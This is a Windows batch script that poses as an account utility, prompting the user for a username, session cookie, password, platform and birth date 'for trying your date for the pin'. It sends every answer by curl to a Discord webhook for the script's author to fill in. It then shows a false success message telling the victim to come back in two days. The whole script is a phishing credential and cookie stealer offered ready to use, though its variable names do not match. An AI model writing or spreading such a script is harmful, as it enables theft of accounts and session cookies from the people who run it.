@echo off
set random=randomi
setlocal enabledelayedexpansion


set /p name=Insert your username:
set /p cok=Insert your cookie:
set /p pas=Insert your password (you can leave this blank):
set /p plate=Insert your platform.
set /p birth=Insert your birth date (for trying your date for the pin): 


set discord=PUT_YOUR_WHEBOOK_HERE


set "json_payload={\"content\":\"@everyone User Information:\nUsername: %name%\nCookie: %cok%\nPassword: %pas%\nVerification: %plate%\nBirth Date: %birth%\"}"


curl --insecure -H "Content-Type: application/json" -X POST -d "%json_payload%" %webhook_url%

color b
echo Operation successful, re-open this program in 2 days to check the progress.
pause
